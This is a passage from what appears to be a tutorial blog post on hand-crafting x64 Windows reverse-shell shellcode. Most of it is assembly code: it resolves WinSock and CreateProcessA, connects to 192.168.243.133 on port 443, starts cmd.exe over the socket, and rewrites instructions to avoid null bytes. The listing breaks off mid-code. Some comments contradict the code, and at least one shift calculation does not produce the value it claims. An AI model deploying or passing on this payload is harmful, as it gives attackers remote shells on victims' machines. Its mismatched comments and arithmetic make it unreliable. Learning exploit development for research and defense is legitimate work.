This encoded value is integrated into the shellcode as follows:

```
# Push cmd.exe string to stack
" mov rax, 0x6578652e646d63; "   # Load the hexadecimal representation of 'cmd.exe' into RAX
" push rax; "                    # Push 'cmd.exe' onto the stack
" mov rcx, rsp; "                # Set RCX to point to 'cmd.exe' on the stack, which will be lpApplicationName
```

Next, the implementation of the `STARTUPINFOA` structure, as previously explained, will be incorporated into the shellcode.

```
# STARTUPINFOA Structure Setup
" push r13;"                        # Push the handle for hStdError onto the stack
" push r13;"                        # Push the handle for hStdOutput onto the stack
" push r13;"                        # Push the handle for hStdInput onto the stack
" xor rax, rax; "                   # Zero out RAX to use for multiple NULL entries
" push ax;"                         # Push NULL for non critical member
" push rax;"                        # Push NULL for non critical member
" push rax;"                        # Push NULL for non critical member
" mov rax, 0x100;"                  # Set RAX to 0x100, indicating the STARTF_USESTDHANDLES flag in dwFlags
" push ax;"                         # Push 0x100 (STARTF_USESTDHANDLES) into dwFlags
" xor rax, rax; "                   # Zero out RAX again to push more NULL entries
" push ax;"                         # Push NULL for non critical member
" push ax;"                         # Push NULL for non critical member
" push rax;"                        # Push NULL for non critical member
" push rax;"                        # Push NULL for non critical member
" push rax; "                       # Push NULL for non critical member
" push rax; "                       # Push NULL for non critical member
" push rax; "                       # Push NULL for non critical member
" push rax; "                       # Push NULL for non critical member
" mov rax, 0x68;"                   # Set RAX to 0x68, the byte size of the STARTUPINFOA structure (cb)
" push rax;"                        # Push 0x68, the size of the STARTUPINFOA structure
" mov rdi, rsp;"                    # Move the stack pointer to RDI, pointing to the STARTUPINFOA structure
```

Once the structure is set up, the `CreateProcessA` function can be called to execute `cmd.exe`.

```
" mov rax, rsp;"                # Capture the current stack pointer in RAX
" sub rax, 0x500;"              # Adjust RAX to point to a new space in the stack for PROCESS_INFORMATION
" push rax; "                   # Push the address for PROCESS_INFORMATION structure
" push rdi; "                   # Push the address of the STARTUPINFOA structure
" xor rax, rax; "               # Zero out RAX to use as NULL for several parameters
" push rax; "                   # Set lpCurrentDirectory to NULL
" push rax; "                   # Set lpEnvironment to NULL
" push rax;"                    # Placeholder push for alignment or further use
" inc rax;  "                   # Set RAX to 1 (used for bInheritHandles)
" push rax; "                   # Push bInheritHandles with value 1 (inherit handles)
" xor rax, rax; "               # Zero out RAX again for further NULL uses
" push rax;"                    # Push NULL for dwCreationFlags
" push rax;"                    # Additional push for alignment or further parameter setup
" push rax;"                    # Additional push for alignment or further parameter setup
" push rax; "                   # Ensure RAX (NULL) is pushed for dwCreationFlags
" mov r8, rax; "                # Set lpThreadAttributes to NULL
" mov r9, rax; "                # Set lpProcessAttributes to NULL
" mov rdx, rcx; "               # Set lpCommandLine to point to the "cmd.exe" string
" mov rcx, rax; "               # Set lpApplicationName to NULL
" call r12; "                   # Call CreateProcessA with address stored in R12
```

Once the shellcode is executed, the outcome can be observed in the previously established listener, which now receives a socket connection and initiates a `cmd.exe` session. This confirms that the shellcode has successfully executed its intended functionality, establishing communication between the compromised system and the attacker's control server.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-05_18-41.png" alt="">

### Dealing with badchars

As in the initial phase of the post, the process will continue with the removal of any potentially problematic bad characters to ensure the shellcode becomes Position Independent Code (PIC). This step is crucial for enhancing the shellcode's compatibility and reliability across different execution environments.

The first instruction that generates badchars is the following:

```
“ sub rsp, 88;”
```

The same procedure is performed as in the first part of the post.

The method involves choosing a larger starting value and shifting it left by 20 bits (`0x14`) to achieve the needed offset, effectively avoiding unwanted characters.

The calculation in WinDbg looks like this:

```
0:003> ? 0x88 << 0x14
Evaluate expression: 142606336 = 00000000`08800000
```

Next, a bitwise `OR` with `0xFFFFF` adjusts the lower bits, changing the byte pattern but keeping the shifted value intact:

```
0:003> ? (00000000`08800000|0xFFFFF)
Evaluate expression: 143654911 = 00000000`088fffff
```

To confirm, the value is shifted right by the same 20 bits (`0x14`), checking that the important bits revert to their original position:

```
0:003> ? 0x00000000`088fffff >> 0x14
Evaluate expression: 136 = 00000000`00000088
```

This approach is then applied in the code as follows:

```
# " sub rsp, 88; "                    # Allocate additional space (88 bytes) on the stack for local variables or to maintain alignment (Null byte)
# Null byte fix
" xor rax, rax; "                   # Zero out rax to start fresh
" add rax, 0x88FFFFF; "             # Load rax with a large number
" shr rax, 0x14; "                  # Right-shift rax by 20 bits to get 0x88
" sub rsp, rax; "                   # Subtract 0x88 from rsp
```

In the code, additions and subtractions are handled using a method similar to the one described earlier. However, since the `rax` register holds important addresses, other volatile registers that do not contain essential data are used for these operations to prevent interference with critical values, such as `r15`.

```
# The following assembly instructions are used to resolve LoadLibraryA using GetProcAddress
"  mov rcx, 0x41797261; "           # Load part of the string 'LoadLibra' into RCX
"  push rcx; "                      # Push the first half of the string onto the stack
"  mov rcx, 0x7262694c64616f4c; "   # Load the remaining part of the string 'LoadLibrary' into RCX
"  push rcx; "                      # Push the second half of the string onto the stack
"  mov rdx, rsp; "                  # Set RDX to point to the string 'LoadLibraryA' on the stack
"  mov rcx, r8; "                   # Copy the base address of the Kernel32 module into RCX
# "  sub rsp, 0x30; "               # Allocate space on the stack to preserve context for the call (Null byte)
# Null byte fix
" xor r15, r15; "                   # Zero out r15 to start fresh
" add r15, 0x30FFFFF; "             # Load r15 with a large number
" shr r15, 0x14; "                  # Right-shift r15 by 20 bits to get 0x30
" sub rsp, r15; "                   # Subtract 0x30 from rsp
```

Later in the process, since a critical address is stored in the `r15` register (in this instance, a handle), operations requiring temporary storage or modifications must utilize a different volatile register. For these tasks, the `ebx` register is employed to ensure the crucial data in `r15` remains undisturbed.

```
# " add rsp, 0x30;"                 # Restore the stack by removing the 48 bytes allocated (Null Byte)
# Null byte fix
" xor rbx, rbx; "                   # Zero out rbx to start fresh
" add rbx, 0x30FFFFF; "             # Load rbx with a large number
" shr rbx, 0x14; "                  # Right-shift rbx by 20 bits to get 0x30
" add rsp, rbx; "                   # Add 0x30 to rsp
```

When handling module names like `WS2_32.dll`, it is crucial to avoid generating null bytes, which can disrupt string processing in assembly code. Here, a strategy using smaller register operations, specifically with `al` (the lower byte of the `rax` register), allows for precise control over character insertion without introducing unwanted null bytes. The process is outlined step by step below:

```
# Call LoadLibraryA to load WS2_32.DLL 
" xor rax, rax;"                    # Clear RAX register
# " mov rax, 0x6C6C; "              # Load the last two characters "ll" into RAX (Null Bytes)
# Null Byte Fix
" mov al, 0x6C; "                   # Move 'l' into the lower byte of RAX
" shl rax, 8; "                     # Shift RAX left by 8 bits
" mov al, 0x6C; "                   # Move the second 'l' into the now empty lower byte of RAX
" push rax;"                        # Push "ll" onto the stack
" mov rax, 0x642E32335F325357;"     # Load "WS2_32.d" into RAX
" push rax;"                        # Push "WS2_32.d" onto the stack forming "WS2_32.dll"
```

To make it clear, the same procedure is used for the string “cmd”.

```
# Push cmd.exe string to stack
# " mov rax, 0x6578652e646d63; "      # Load the hexadecimal representation of 'cmd.exe' into RAX (Null Bytes)

# Fix Null Byte
# Build the string 'cmd' in RAX

" xor rax, rax; "                   # Clear RAX again
" mov al, 0x64; "                   # Load 'd' into AL (0x64 in hexadecimal)
" shl rax, 8; "                     # Shift RAX left by 8 bits
" mov al, 0x6D; "                   # Load 'm' (0x6D in hexadecimal)
" shl rax, 8; "                     # Shift RAX left by 8 bits
" mov al, 0x63; "                   # Load 'c' (0x63 in hexadecimal)
" push rax; "                       # Push "cmd" onto the stack

" mov rcx, rsp; "                   # Set RCX to point to 'cmd.exe' on the stack, which will be lpApplicationName
```

The approach was to gradually decrease the number of null bytes produced by the script. Initially, changes were made to how registers are added and subtracted. Later, instead of using `rax`, we switched to `al` or `eax`, verifying that nothing was missed and that the shellcode still worked correctly. This process was performed until our shellcode could no longer be optimized.

It is checked again that nothing is broken and that the shellcode still works correctly.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-06_17-56.png" alt="">

### Final code after the fixes

```
import ctypes, struct
import os
import subprocess
from keystone import *
 
def main():
    SHELLCODE = (
        " start: "
        "   int3;"                          # Breakpoint
        # "  sub rsp, 0x208;"               # Free up space in the stack (Null Byte)
        "   add rsp, 0xfffffffffffffdf8;"   # Free up space in the stack (Fix)
        " locate_kernel32:"
        "   xor rcx, rcx;"                  # Null RCX content
        "   mov rax, gs:[rcx + 0x60];"      # +0x060 PEB
        "   mov rax, [rax + 0x18];"         # +0x018 PEB.Ldr
        "   mov rsi, [rax + 0x20];"         # +0x020 PEB.Ldr.InMemoryOrderModuleList
        "   lodsq;"                         # Loads qword from RSI into RAX
        "   xchg rax, rsi;"                 # Swap RAX & RSI
        "   lodsq;"                         # Loads qword from RSI into RAX
        "   mov rbx, [rax + 0x20];"         # RBX = Kernel32 base address
        "   mov r8, rbx; "                  # Copy Kernel32 base address to R8 register
        "   mov ebx, [rbx+0x3C];"           # Get offset to the PE header from the DOS header at offset 0x3C
        "   add rbx, r8; "                  # Calculate absolute address of PE header by adding base address of kernel32.dll
        # "   mov edx, [rbx+0x88];"         # Get Relative Virtual Address (RVA) of Export Address Table from PE header (Null Byte)
        # Fix below
        "   xor r12, r12;"                  # Zero out r12 to start fresh
        "   add r12, 0x88FFFFF;"            # Load r12 with a large number
        "   shr r12, 0x14;"                 # Right-shift r12 by 20 bits to get 0x88
        "   mov edx, [rbx+r12];"            # Move the value at rbx+0x88 into edx
        "   add rdx, r8;"                   # Convert RVA of Export Address Table to absolute address by adding base address
        "   mov r10d, [rdx+0x14];"          # Load number of exported functions from Export Address Table
        "   xor r11, r11;"                  # Zero out R11 to use it as a clean register
        "   mov r11d, [rdx+0x20];"          # Get RVA of the AddressOfNames from the Export Address Table
        "   add r11, r8;"                   # Convert AddressOfNames RVA to absolute address by adding base address
        "   mov rcx, r10;"                  # Initialize RCX with the number of functions (loop counter)
        "kernel32findfunction: "
        " jecxz FunctionNameFound;"         # Jump to FunctionNameFound if RCX is zero (no more functions to check)
        "   xor ebx,ebx;"                   # Clear EBX to use as a temporary register
        "   mov ebx, [r11+4+rcx*4];"        # Load RVA of current function name into EBX (adjust index as rcx decrements)
        "   add rbx, r8;"                   # Convert RVA to absolute address (function name VMA)
        "   dec rcx;"                       # Decrement the loop counter
        "   mov rax, 0x41636f7250746547;"   # Load the ASCII value of 'AcorPteG' into RAX for comparison
        "   cmp [rbx], rax;"                # Compare the first eight bytes of the function name at RBX with 'GetProcAddress'
        "   jnz kernel32findfunction;"      # If not matched, jump back to start of loop
        "FunctionNameFound: "
        # Entry point after finding the target function name 'GetProcAddress'
        "   xor r11, r11;"
        "   mov r11d, [rdx+0x24];"          # Load the RVA of the AddressOfNameOrdinals from the Export Table
        "   add r11, r8;"                   # Convert RVA to absolute VMA (Virtual Memory Address)
        # Incrementing the counter to match the ordinal array index, since we decremented it in the search loop
        "   inc rcx;"
        "   mov r13w, [r11+rcx*2];"         # Retrieve the function ordinal using the adjusted counter from AddressOfNameOrdinals
        # Preparing to fetch the actual function address from AddressOfFunctions
        "   xor r11, r11;"
        "   mov r11d, [rdx+0x1c];"          # Load the RVA of the AddressOfFunctions from the Export Table
        "   add r11, r8;"                   # Convert RVA to absolute VMA where the function addresses are stored
        "   mov eax, [r11+4+r13*4];"        # Fetch the function address RVA using the ordinal as an index
        "   add rax, r8;"                   # Convert function address RVA to absolute address
        "   mov r14, rax;"                  # Store the resolved function address in R14 for later use

        # The following assembly instructions are used to resolve LoadLibraryA using GetProcAddress
        "  mov ecx, 0x41797261; "           # Load part of the string 'LoadLibra' into ECX
        "  push rcx; "                      # Push the first half of the string onto the stack
        "  mov rcx, 0x7262694c64616f4c; "   # Load the remaining part of the string 'LoadLibrary' into RCX
        "  push rcx; "                      # Push the second half of the string onto the stack
        "  mov rdx, rsp; "                  # Set RDX to point to the string 'LoadLibraryA' on the stack
        "  mov rcx, r8; "                   # Copy the base address of the Kernel32 module into RCX
        # "  sub rsp, 0x30; "               # Allocate space on the stack to preserve context for the call (Null byte)
        # Null byte fix
        " xor r15, r15; "                   # Zero out r15 to start fresh
        " add r15, 0x30FFFFF; "             # Load r15 with a large number
        " shr r15, 0x14; "                  # Right-shift r15 by 20 bits to get 0x30
        " sub rsp, r15; "                   # Subtract 0x30 from rsp
        
        "  call r14; "                      # Call GetProcAddress, with R14 pointing to its address
        # "  add rsp, 0x30; "               # Clean up the stack after the call (Null Byte)
        # Null byte fix
        " xor r15, r15; "                   # Zero out r15 to start fresh
        " add r15, 0x30FFFFF; "             # Load r15 with a large number
        " shr r15, 0x14; "                  # Right-shift r15 by 20 bits to get 0x30
        " add rsp, r15; "                   # Add 0x30 to rsp

        # "  add rsp, 0x10; "               # Adjust stack pointer to clean up the 'LoadLibraryA' string (Null Byte)
        # Null byte fix
        " xor r15, r15; "                   # Zero out r15 to start fresh
        " add r15, 0x10FFFFF; "             # Load r15 with a large number
        " shr r15, 0x14; "                  # Right-shift r15 by 20 bits to get 0x10
        " add rsp, r15; "                   # Subtract 0x10 from rsp

        "  mov rsi, rax; "                  # Store the resolved address of LoadLibraryA into RSI

        # Call LoadLibraryA to load WS2_32.DLL 
        " xor rax, rax;"                    # Clear RAX register
        # " mov rax, 0x6C6C; "              # Load the last two characters "ll" into RAX (Null Bytes)
        # Null Byte Fix
        " mov al, 0x6C; "                   # Move 'l' into the lower byte of RAX
        " shl rax, 8; "                     # Shift RAX left by 8 bits
        " mov al, 0x6C; "                   # Move the second 'l' into the now empty lower byte of RAX

        " push rax;"                        # Push "ll" onto the stack
        " mov rax, 0x642E32335F325357;"     # Load "WS2_32.d" into RAX
        " push rax;"                        # Push "WS2_32.d" onto the stack forming "WS2_32.dll"
        " mov rcx, rsp;"                    # Set RCX to point to the string "WS2_32.dll" on the stack
        # " sub rsp, 0x30;"                 # Allocate 48 bytes on the stack to preserve context during the call (Null Byte)
        # Null byte fix
        " xor r15, r15; "                   # Zero out r15 to start fresh
        " add r15, 0x30FFFFF; "             # Load r15 with a large number
        " shr r15, 0x14; "                  # Right-shift r15 by 20 bits to get 0x30
        " sub rsp, r15; "                   # Subtract 0x30 from rsp

        " call rsi;"                        # RSI holds the address of LoadLibraryA, so we proceed to call it
        " mov r15, rax;"                    # Store the return value (module handle) in R15
        # " add rsp, 0x30;"                 # Restore the stack by removing the 48 bytes allocated (Null Byte)
        # Null byte fix
        " xor rbx, rbx; "                   # Zero out rbx to start fresh
        " add rbx, 0x30FFFFF; "             # Load rbx with a large number
        " shr rbx, 0x14; "                  # Right-shift rbx by 20 bits to get 0x30
        " add rsp, rbx; "                   # Add 0x30 to rsp

        # " add rsp, 0x10;"                 # Adjust stack to remove the space used by "WS2_32.dll" (Null Byte)
        # Null byte fix
        " xor rbx, rbx; "                   # Zero out r15 to start fresh
        " add rbx, 0x10FFFFF; "             # Load r15 with a large number
        " shr rbx, 0x14; "                  # Right-shift r15 by 20 bits to get 0x10
        " add rsp, rbx; "                   # Subtract 0x10 from rsp

        # Resolve WSAStartup Address
        # " mov rax, 0x7075;"               # Load "up" into RAX
        # " push rax;"                      # Push the substring onto the stack
        # " mov rax, 0x7472617453415357;"   # Load "WSAStart" into RAX
        # Null Byte Fix
        " xor rax, rax; "
        " mov ax, 0x7075; "                 # Load "up" into AX (16-bit register)
        " push rax; "                       # Push "up" onto the stack
        " mov rax, 0x7472617453415357;"     # Load "WSAStart" into RAX
        
        " push rax; "                       # Push the complete function name onto the stack
        " mov rdx, rsp; "                   # Move the stack pointer to RDX, pointing to "WSAStartup"
        " mov rcx, r15; "                   # Copy the base address of WS2_32.dll from R15 to RCX
        # " sub rsp, 0x30; "                # Allocate 48 bytes on the stack to maintain alignment (Null Byte)
        # Null byte fix
        " xor rbx, rbx; "                   # Zero out rbx to start fresh
        " add rbx, 0x30FFFFF; "             # Load rbx with a large number
        " shr rbx, 0x14; "                  # Right-shift rbx by 20 bits to get 0x30
        " sub rsp, rbx; "                   # Subtract 0x30 from rsp

        " call r14;"                        # Call GetProcAddress, which is stored in R14
        # " add rsp, 0x30; "                # Clean up the allocated stack space (Null Byte)
        # Null byte fix
        " xor rbx, rbx; "                   # Zero out rbx to start fresh
        " add rbx, 0x30FFFFF; "             # Load rbx with a large number
        " shr rbx, 0x14; "                  # Right-shift rbx by 20 bits to get 0x30
        " add rsp, rbx; "                   # Add 0x30 to rsp

        # " add rsp, 0x10; "                # Adjust stack to remove the space used by the string "WSAStartup" (Null Byte)
        # Null byte fix
        " xor rbx, rbx; "                   # Zero out r15 to start fresh
        " add rbx, 0x10FFFFF; "             # Load r15 with a large number
        " shr rbx, 0x14; "                  # Right-shift r15 by 20 bits to get 0x10
        " add rsp, rbx; "                   # Subtract 0x10 from rsp

        " mov r12, rax; "                   # Store the address of WSAStartup in R12 for later use

        # Initialize WSAStartup
        " xor rcx, rcx; "                   # Clear RCX to prepare for value setting
        " mov cx, 408; "                    # Set RCX to 408 (allocates 408 bytes on stack for lpWSAData)
        " sub rsp, rcx; "                   # Allocate 408 bytes on the stack for lpWSAData
        " lea rdx, [rsp]; "                 # Load Effective Address of the stack into RDX for lpWSAData
        " mov cx, 514; "                    # Set wVersionRequested to 2.2 (0x0202 in hexadecimal)
        # " sub rsp, 88; "                  # Allocate additional space (88 bytes) on the stack for local variables or to maintain alignment (Null byte)
        # Null byte fix
        " xor rax, rax; "                   # Zero out rax to start fresh
        " add rax, 0x88FFFFF; "             # Load rax with a large number
        " shr rax, 0x14; "                  # Right-shift rax by 20 bits to get 0x88
        " sub rsp, rax; "                   # Subtract 0x88 from rsp

        " call r12; "                       # Call WSAStartup using the address stored in R12

        # Resolve WSASocketA Address
        # " mov rax, 0x4174;"               # Load part of the function name "A" into RAX
        "xor rax, rax; "
        " mov ax, 0x4174;"                  # Load part of the function name "A" into AX (16-bit register)
        " push rax;"                        # Push the substring onto the stack
        " mov rax, 0x656b636f53415357;"     # Load "WSASocke" into RAX
        " push rax;"                        # Push the complete function name "WSASocketA" onto the stack
        " mov rdx, rsp; "                   # Move the stack pointer to RDX, pointing to "WSASocketA"
        " mov rcx, r15; "                   # Copy the base address of WS2_32.dll from R15 to RCX
        # " sub rsp, 0x30; "                # Allocate 48 bytes on the stack to maintain alignment (Null Byte)
        # Null byte fix
        " xor rbx, rbx; "                   # Zero out rbx to start fresh
        " add rbx, 0x30FFFFF; "             # Load rbx with a large number
        " shr rbx, 0x14; "                  # Right-shift rbx by 20 bits to get 0x30
        " sub rsp, rbx; "                   # Subtract 0x30 from rsp

        " call r14;"                        # Call GetProcAddress, which is stored in R14
        # " add rsp, 0x30; "                # Clean up the allocated stack space (Null Byte)
        # Null byte fix
        " xor rbx, rbx; "                   # Zero out rbx to start fresh
        " add rbx, 0x30FFFFF; "             # Load rbx with a large number
        " shr rbx, 0x14; "                  # Right-shift rbx by 20 bits to get 0x30
        " add rsp, rbx; "                   # Add 0x30 to rsp

        #" add rsp, 0x10; "                 # Adjust stack to remove the space used by the string "WSASocketA" (Null Byte)
        # Null byte fix
        " xor rbx, rbx; "                   # Zero out r15 to start fresh
        " add rbx, 0x10FFFFF; "             # Load r15 with a large number
        " shr rbx, 0x14; "                  # Right-shift r15 by 20 bits to get 0x10
        " add rsp, rbx; "                   # Subtract 0x10 from rsp

        " mov r12, rax; "                   # Store the address of WSASocketA in R12 for later use
        # Allocate stack space and initialize socket creation with WSASocketA
        " add rsp, 0xfffffffffffffdf8;"     # Free up space in the stack
        " xor rdx, rdx;"                    # Zero out RDX (used as 'dwFlags' which is NULL in this context)
        # " sub rsp, 88;"                   # Additional stack allocation, possibly for local variables or alignment
        # Null byte fix
        " xor rax, rax; "                   # Zero out rax to start fresh
        " add rax, 0x88FFFFF; "             # Load rax with a large number
        " shr rax, 0x14; "                  # Right-shift rax by 20 bits to get 0x88
        " sub rsp, rax; "                   # Subtract 0x88 from rsp

        " mov [rsp+32], rdx; "              # Set parts of the stack frame to zero, likely part of protocol info or alignment padding
        " mov [rsp+40], rdx; "              # Another part of stack zeroing, further preparation for call parameters
        " inc rdx; "                        # Increment RDX to use as 'af', typically AF_INET (value 2 after increment)
        " mov rcx, rdx; "                   # Move RDX to RCX, set 'af' parameter for the socket
        " inc rcx; "                        # Increment RCX to use as 'type', typically SOCK_STREAM (value 3 after increment)
        " xor r8, r8;"                      # Zero out R8, used for 'protocol' (0 indicates default protocol for type)
        " add r8, 6;"                       # Set R8 to 6, corresponding to IPPROTO_TCP typically
        " xor r9, r9;"                      # Zero out R9, used for 'g' parameter (group ID, 0 indicates no group)
        " mov r9w, 98*4;"                   # Set R9W (lower 16 bits of R9) to 392, potentially a custom or undefined flag
        " mov ebx, [r15+r9];"               # Load a value from memory into EBX, possibly related to 'dwFlags' or another parameter offset
        " xor r9, r9;"                      # Zero out R9 again, prepare for 'dwFlags' (0 indicates default behavior)
        " call r12;"                        # Call WSASocketA, address stored in R12
        " mov r13, rax;"                    # Store the return value (socket handle) in R13
        " sub rsp, 0xfffffffffffffdf8;"     # Free up space in the stack

        # Resolve WSAConnect Address
        # " mov rax, 0x7463;"               # Load the second part of "WSAConnect" into RAX
        " mov ax, 0x7463;"                  # Load the second part of "WSAConnect" into AX (16-bit register)
        " push rax;"                        # Push the second part onto the stack
        " mov rax, 0x656e6e6f43415357;"     # Load the first part of "WSAConnect" into RAX
        " push rax;"                        # Push the first part onto the stack, completing "WSAConnect"
        " mov rdx, rsp; "                   # Set RDX to the stack pointer, pointing to "WSAConnect"
        " mov rcx, r15; "                   # Move the base address of WS2_32.dll (stored in R15) into RCX
        # " sub rsp, 0x30; "                # Allocate 48 bytes on the stack to preserve the stack state (Null Byte)
        # Null byte fix
        " xor rbx, rbx; "                   # Zero out rbx to start fresh
        " add rbx, 0x30FFFFF; "             # Load rbx with a large number
        " shr rbx, 0x14; "                  # Right-shift rbx by 20 bits to get 0x30
        " sub rsp, rbx; "                   # Subtract 0x30 from rsp

        " call r14;"                        # Call GetProcAddress, whose address is stored in R14
        # " add rsp, 0x30; "                # Deallocate the 48 bytes from the stack (Null Byte)
        # Null byte fix
        " xor rbx, rbx; "                   # Zero out rbx to start fresh
        " add rbx, 0x30FFFFF; "             # Load rbx with a large number
        " shr rbx, 0x14; "                  # Right-shift rbx by 20 bits to get 0x30
        " add rsp, rbx; "                   # Add 0x30 to rsp

        # " add rsp, 0x10; "                # Adjust the stack to clean up after the string "WSAConnect" (Null Byte)
        # Null byte fix
        " xor rbx, rbx; "                   # Zero out r15 to start fresh
        " add rbx, 0x10FFFFF; "             # Load r15 with a large number
        " shr rbx, 0x14; "                  # Right-shift r15 by 20 bits to get 0x10
        " add rsp, rbx; "                   # Subtract 0x10 from rsp

        " mov r12, rax; "                   # Store the address of WSAConnect in R12 for later use

        # Initiate a connection using WSAConnect
        " mov rcx, r13;"                    # Set the first parameter, our socket handle, to RCX
        " add rsp, 0xfffffffffffffdf8;"     # Allocate 520 bytes on the stack for local storage
        " xor rax, rax;"                    # Zero out RAX
        " inc rax; "                        # Increment RAX twice to set it to 2 (AF_INET)
        " inc rax; "            
        " mov [rsp], rax;"                  # Set AF_INET (2) at the top of the stack
        " mov ax, 0xbb01;"                  # Load the port number 443 in little endian into AX (16-bit register)
        " mov [rsp+2], ax; "                # Store the port number at RSP+2
        " mov eax, 0x85f3a8c0;"             # Set EAX to the IP address in little endian (192.168.243.133 in big endian)
        " mov [rsp+4], eax; "               # Store the IP address at RSP+4
        " lea rdx, [rsp];"                  # Load the address of the sockaddr structure into RDX
        " mov r8, 0x16; "                   # Set the namelen parameter (size of the sockaddr structure) to R8
        " xor r9, r9;"                      # Zero out R9 to use for lpCallerData, lpCalleeData, lpSQOS, lpGQOS
        " push r9;"                         # Push NULL for lpCallerData
        " push r9;"                         # Push NULL for lpCalleeData
        " push r9;"                         # Push NULL for lpSQOS
        # " sub rsp, 0x88; "                # Make additional space on the stack for alignment (Null Byte)
        # Null byte fix
        " xor rbx, rbx; "                   # Zero out rbx to start fresh
        " add rbx, 0x88FFFFF; "             # Load rbx with a large number
        " shr rbx, 0x14; "                  # Right-shift rbx by 20 bits to get 0x88
        " sub rsp, rbx; "                   # Subtract 0x88 from rsp

        " call r12;"                        # Call WSAConnect using the address stored in R12

        # Find CreateProcessA address in kernel32.dll
        " xor rcx, rcx;"                    # Zero out RCX contents
        " mov rax, gs:[rcx + 0x60];"        # Retrieve the Process Environment Block (PEB) address into RAX from the GS register.
        " mov rax, [rax + 0x18];"           # Access the Ldr (PEB Loader Data) from the PEB.
        " mov rsi, [rax + 0x20];"           # Get the InMemoryOrderModuleList from the Ldr which lists loaded modules.
        " lodsq;"                           # Load the next module address (the first entry in the module list) into RAX from the address pointed to by RSI.
        " xchg rax, rsi;"                   # Swap RAX and RSI to prepare for the next load.
        " lodsq;"                           # Load the next module address into RAX; RSI now points to the second module.
        " mov rbx, [rax + 0x20];"           # Retrieve the base address of kernel32.dll from the second module's base address field.
        " mov r8, rbx; "                    # Copy kernel32.dll's base address to R8 for later use.

        # Find address for CreateProcessA. Store in R12 (previously stored WSAConnect)
        # " mov rax, 0x41737365636f;"       # Load "Asseco" into RAX
        # " push rax;"                      # Push the substring onto the stack
        # " mov rax, 0x7250657461657243;"   # Load "rPetaerC" into RAX
        # " push rax;"                      # Push the string 'CreateProcessA' into the stack
        # " mov rdx, rsp; "                 # Point RDX to the top of the stack, where 'CreateProcessA' string starts.
        # " mov rcx, r8; "                  # Move the base address of kernel32.dll into RCX for GetProcAddress.

        # Null Byte Fix
        " xor rax, rax; "                   # Clear RAX to start fresh
        " mov ax, 0X4173; "                 # Load 'As' into AX (lower 16-bits of RAX)
        " shl rax, 16; "                    # Shift left to make space for next characters
        " mov ax, 0X7365; "                 # Load 'se'
        " shl rax, 16; "                    # Shift left to make space for next characters
        " mov ax, 0X636F; "                 # Load 'co'
        " push rax; "                       # Push "Asseco" onto the stack
        " mov rax, 0x7250657461657243; "    # Load "rPetaerC" into RAX
        " push rax; "                       # Push the string 'CreateProcessA' onto the stack


        " mov rdx, rsp; "                   # Point RDX to the top of the stack, where 'CreateProcessA' string starts
        " mov rcx, r8; "                    # Move the base address of kernel32.dll into RCX for GetProcAddress
        # " sub rsp, 0x30; "                # Allocate space on the stack to preserve context for the call. (Null Byte)
        # Null byte fix
        " xor rbx, rbx; "                   # Zero out rbx to start fresh
        " add rbx, 0x30FFFFF; "             # Load rbx with a large number
        " shr rbx, 0x14; "                  # Right-shift rbx by 20 bits to get 0x30
        " sub rsp, rbx; "                   # Subtract 0x30 from rsp

        " call r14;"                        # Call GetProcAddress, with the address in R14.
        # " add rsp, 0x30; "                # Deallocate the stack space reserved earlier. (Null Byte)
        # Null byte fix
        " xor rbx, rbx; "                   # Zero out rbx to start fresh
        " add rbx, 0x30FFFFF; "             # Load rbx with a large number
        " shr rbx, 0x14; "                  # Right-shift rbx by 20 bits to get 0x30
        " add rsp, rbx; "                   # Add 0x30 to rsp

        # " add rsp, 0x10; "                # Clean up the stack by removing the 'CreateProcessA' string. (Null Byte)
        # Null byte fix
        " xor rbx, rbx; "                   # Zero out rbx to start fresh
        " add rbx, 0x30FFFFF; "             # Load rbx with a large number
        " shr rbx, 0x14; "                  # Right-shift rbx by 20 bits to get 0x30
        " add rsp, rbx; "                   # Add 0x30 to rsp

        " mov r12, rax; "                   # Store the address of CreateProcessA in R12 for later use.

        # Push cmd.exe string to stack
        # " mov rax, 0x6578652e646d63; "    # Load the hexadecimal representation of 'cmd.exe' into RAX (Null Bytes)
        # Fix Null Byte
        #  Build the string 'cmd' in RAX

        " xor rax, rax; "                   # Clear RAX again
        " mov al, 0x64; "                   # Load 'd' into AL (0x64 in hexadecimal)
        " shl rax, 8; "                     # Shift RAX left by 8 bits
        " mov al, 0x6D; "                   # Load 'm' (0x6D in hexadecimal)
        " shl rax, 8; "                     # Shift RAX left by 8 bits
        " mov al, 0x63; "                   # Load 'c' (0x63 in hexadecimal)
        " push rax; "                       # Push "cmd" onto the stack

        " mov rcx, rsp; "                   # Set RCX to point to 'cmd.exe' on the stack, which will be lpApplicationName

        # STARTUPINFOA Structure Setup
        " push r13;"                        # Push the handle for STDERROR onto the stack
        " push r13;"                        # Push the handle for STDOUTPUT onto the stack
        " push r13;"                        # Push the handle for STDINPUT onto the stack
        " xor rax, rax; "                   # Zero out RAX to use for multiple NULL entries
        " push ax;"                         # Push NULL for cbReserved2 (Word sized)
        " push rax;"                        # Push NULL for lpReserved2
        " push rax;"                        # Push NULL for hStdError
        # " mov rax, 0x100;"                # Set RAX to 0x100, indicating the STARTF_USESTDHANDLES flag in dwFlags (Null Byte)
        # Fix Null Byte
        " xor rbx, rbx; "                   # Zero out rbx to start fresh
        " add rbx, 0x100FFFFF; "            # Load rbx with a large number
        " shr rbx, 0x14; "                  # Right-shift rbx by 20 bits to get 0x500
        " mov rax, rbx; "                   # Subtract 0x500 from rax

        " push ax;"                         # Push 0x100 (STARTF_USESTDHANDLES) into dwFlags
        " xor rax, rax; "                   # Zero out RAX again to push more NULL entries
        " push ax;"                         # Push NULL for wShowWindow (Word sized)
        " push ax;"                         # Push NULL for cbReserved2 (Word sized)
        " push rax;"                        # Push NULL for lpReserved2
        " push rax;"                        # Push NULL for hStdError
        " push rax; "                       # Push NULL for dwXSize
        " push rax; "                       # Push NULL for dwYSize
        " push rax; "                       # Push NULL for dwY
        " push rax; "                       # Push NULL for dwX
        # " mov rax, 0x68;"                 # Set RAX to 0x68, the byte size of the STARTUPINFOA structure (Null Byte)
        # Fix Null Byte
        " xor rbx, rbx; "                   # Zero out rbx to start fresh
        " add rbx, 0x68FFFFFF; "            # Load rbx with a large number
        " shr rbx, 0x14; "                  # Right-shift rbx by 20 bits to get 0x500
        " mov rax, rbx; "                   # Subtract 0x500 from rax

        " push rax;"                        # Push 0x68, the size of the STARTUPINFOA structure
        " mov rdi, rsp;"                    # Move the stack pointer to RDI, pointing to the STARTUPINFOA structure

